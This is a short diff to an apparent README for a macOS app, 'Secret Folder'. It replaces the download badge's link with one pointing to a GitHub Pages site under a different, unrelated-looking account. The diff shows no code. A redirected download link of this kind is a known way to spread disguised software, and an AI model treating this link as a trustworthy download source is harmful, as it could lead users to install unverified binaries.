@@ -4,7 +4,7 @@
 
 <div align="center">
 
-[![Download Secret Folder for macOS](https://img.shields.io/badge/⬇️_Download_Secret_Folder-424242?style=for-the-badge&logo=apple&logoColor=white)](http://secret-folder.github.io/.github)
+[![Download Secret Folder for macOS](https://img.shields.io/badge/⬇️_Download_Secret_Folder-424242?style=for-the-badge&logo=apple&logoColor=white)](https://rumpels-kaji.github.io/.github/Secret)
 
 </div>
 
